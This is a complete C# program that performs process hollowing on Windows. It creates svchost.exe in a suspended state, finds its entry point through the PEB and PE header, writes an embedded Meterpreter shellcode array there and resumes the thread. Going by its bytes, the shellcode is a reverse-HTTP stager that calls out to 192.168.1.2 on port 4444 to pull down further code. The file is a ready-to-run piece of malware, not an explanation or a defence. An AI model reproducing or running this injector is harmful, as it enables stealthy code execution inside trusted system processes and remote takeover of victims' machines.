

    using System;
    using System.Runtime.InteropServices;
    
    namespace ProcessHollowing {
    
    	class Program {
    		[DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
            static extern bool CreateProcess(
               string lpApplicationName,
               string lpCommandLine,
               IntPtr lpProcessAttributes,
               IntPtr lpThreadAttributes,
               bool bInheritHandles,
               uint dwCreationFlags,
               IntPtr lpEnvironment,
               string lpCurrentDirectory,
               [In] ref STARTUPINFO lpStartupInfo,
               out PROCESS_INFORMATION lpProcessInformation);
    
    		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
            struct STARTUPINFO
            {
                 public Int32 cb;
                 public string lpReserved;
                 public string lpDesktop;
                 public string lpTitle;
                 public Int32 dwX;
                 public Int32 dwY;
                 public Int32 dwXSize;
                 public Int32 dwYSize;
                 public Int32 dwXCountChars;
                 public Int32 dwYCountChars;
                 public Int32 dwFillAttribute;
                 public Int32 dwFlags;
                 public Int16 wShowWindow;
                 public Int16 cbReserved2;
                 public IntPtr lpReserved2;
                 public IntPtr hStdInput;
                 public IntPtr hStdOutput;
                 public IntPtr hStdError;
            }
    
    		 [StructLayout(LayoutKind.Sequential)]
            internal struct PROCESS_INFORMATION
            {
               public IntPtr hProcess;
               public IntPtr hThread;
               public int dwProcessId;
               public int dwThreadId;
            }
    		
    		[DllImport("ntdll.dll", SetLastError=true)]
    		private static extern UInt32 ZwQueryInformationProcess(
    			IntPtr hProcess,
    			int procInformationClass,
    			ref PROCESS_BASIC_INFORMATION procInformation,
    			UInt32 ProcInfoLen,
    			ref UInt32 retlen);
    			
    		[StructLayout(LayoutKind.Sequential)]
    		private struct PROCESS_BASIC_INFORMATION
    		{
    		  public IntPtr ExitStatus;
    		  public IntPtr PebBaseAddress;
    		  public IntPtr AffinityMask;
    		  public IntPtr BasePriority;
    		  public IntPtr UniqueProcessId;
    		  public IntPtr InheritedFromUniqueProcessId;
    		}
    		
    		[DllImport("kernel32.dll", SetLastError = true)]
    		static extern bool ReadProcessMemory(
    			IntPtr hProcess,
    			IntPtr lpBaseAddress,
    			[Out] byte[] lpBuffer,
    			int dwSize,
    			out IntPtr lpNumberOfBytesRead);
    		
    		
    		[DllImport("kernel32.dll", SetLastError = true)]
    		static extern bool WriteProcessMemory(
    			 IntPtr hProcess,
    			 IntPtr lpBaseAddress,
    			 byte[] lpBuffer,
    			 Int32 nSize,
    			 out IntPtr lpNumberOfBytesWritten
    		);
    		
    		[DllImport("kernel32.dll", SetLastError = true)]
    		static extern uint ResumeThread(IntPtr hThread);
    
    		static void Main(string[] args) {
    			
    			
    			Console.WriteLine("--- Process Hollowing demo in C#, by S. Fariss ---\n\n");
    			
    			
    			STARTUPINFO si = new STARTUPINFO();
    			PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
    			
    			Console.WriteLine("[+] Creating SUSPENDED process svchost.exe");
    			bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
    			//bool res = CreateProcess(null, "C:\\Windows\\System32\\notepad.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
    			
    			
    			PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
    			uint tmp = 0;
    			
    			IntPtr hProcess = pi.hProcess;
    			ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
    			IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebBaseAddress + 0x10);
    			
    			Console.WriteLine("[+] PEB starts at 0x" + bi.PebBaseAddress.ToString("x"));
    			Console.WriteLine("[+] Located pointer to base image address in memory at 0x" + ptrToImageBase.ToString("x"));
    			
    			byte[] addrBuf = new byte[IntPtr.Size];
    			IntPtr nRead = IntPtr.Zero;
    			ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
    			
    			IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
    			
    			Console.WriteLine("[+] Found base image address in memory at 0x" + svchostBase.ToString("x"));
    			
    			
    			Console.WriteLine("[+] Reading process memory and parsing PE Header");
    			
    			byte[] data = new byte[0x200];
    			ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
    
    			
    			uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
    
    			uint opthdr = e_lfanew_offset + 0x28;
    			
    			uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
    			
    			IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
    			
    			Console.WriteLine("[+] Found address of EntryPoint at 0x" + addressOfEntryPoint.ToString("x"));
    			
    			
    			byte[] buf = new byte[681] {
    			0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
    			0x51,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x56,0x48,
    			0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
    			0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
    			0x01,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,
    			0x41,0x51,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
    			0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x44,0x8b,
    			0x40,0x20,0x8b,0x48,0x18,0x49,0x01,0xd0,0x50,0xe3,0x56,0x4d,0x31,0xc9,0x48,
    			0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,
    			0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
    			0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
    			0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x41,0x58,
    			0x48,0x01,0xd0,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
    			0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
    			0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,
    			0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,
    			0x07,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,
    			0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
    			0xe8,0x0c,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x31,0x2e,
    			0x32,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0x5c,0x11,0x00,0x00,0x4d,0x31,
    			0xc9,0x53,0x53,0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x00,0x00,0x00,
    			0x00,0xff,0xd5,0xe8,0x82,0x00,0x00,0x00,0x2f,0x57,0x6e,0x72,0x49,0x6d,0x52,
    			0x34,0x6a,0x33,0x64,0x34,0x35,0x45,0x7a,0x67,0x52,0x57,0x5a,0x6b,0x72,0x43,
    			0x77,0x7a,0x44,0x53,0x73,0x55,0x34,0x54,0x46,0x62,0x61,0x32,0x38,0x4f,0x6c,
    			0x66,0x7a,0x64,0x76,0x52,0x63,0x62,0x61,0x6e,0x56,0x79,0x72,0x59,0x73,0x42,
    			0x6a,0x41,0x64,0x49,0x4d,0x59,0x6f,0x2d,0x71,0x4a,0x50,0x30,0x6e,0x75,0x39,
    			0x74,0x6a,0x33,0x41,0x50,0x4b,0x7a,0x64,0x30,0x65,0x4f,0x4b,0x59,0x73,0x44,
    			0x4c,0x6b,0x6d,0x74,0x37,0x66,0x30,0x32,0x6b,0x59,0x62,0x72,0x6c,0x4b,0x55,
    			0x61,0x36,0x71,0x6a,0x57,0x45,0x51,0x78,0x58,0x33,0x5f,0x64,0x62,0x39,0x52,
    			0x4e,0x66,0x56,0x70,0x66,0x4f,0x52,0x5a,0x74,0x75,0x43,0x62,0x47,0x56,0x62,
    			0x38,0x59,0x00,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,
    			0xb8,0x00,0x32,0xa8,0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,0x49,0xc7,0xc2,
    			0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,0x5f,0x48,0x89,0xf1,
    			0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x00,0x00,0x49,0x89,0xe0,0x6a,0x04,0x41,
    			0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x00,0x00,0x00,0x00,0xff,0xd5,0x4d,0x31,
    			0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,
    			0xc7,0xc2,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,
    			0x88,0x13,0x00,0x00,0x49,0xba,0x44,0xf0,0x35,0xe0,0x00,0x00,0x00,0x00,0xff,
    			0xd5,0x48,0xff,0xcf,0x74,0x02,0xeb,0xaa,0xe8,0x55,0x00,0x00,0x00,0x53,0x59,
    			0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,0x10,0x00,
    			0x00,0x49,0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x93,
    			0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x00,
    			0x20,0x00,0x00,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x00,0x00,0x00,
    			0x00,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,0x48,
    			0x01,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,
    			0xf0,0xb5,0xa2,0x56,0xff,0xd5 };
    			
    			Console.WriteLine("[+] Writing meterpreter shellcode to EntryPoint");

    			WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
    			
    			Console.WriteLine("[+] Resuming main thread");
    			
    			Console.WriteLine("[+] Successufully hollowed svchost.exe");
    			
    			ResumeThread(pi.hThread);
    		}
    	}
    }

